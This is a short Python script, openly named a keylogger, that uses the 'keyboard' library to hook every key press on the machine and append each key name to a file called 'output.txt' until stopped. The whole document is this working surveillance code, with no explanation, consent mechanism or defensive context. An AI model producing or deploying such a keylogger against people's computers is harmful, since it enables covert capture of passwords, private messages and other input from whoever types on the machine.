import keyboard
keylogger_file = 'output.txt'


def keylog(event):
    with open(keylogger_file , 'a') as f:
        f.write('{}\n'.format(event.name))

    
keyboard.on_press(keylog)
keyboard.wait()

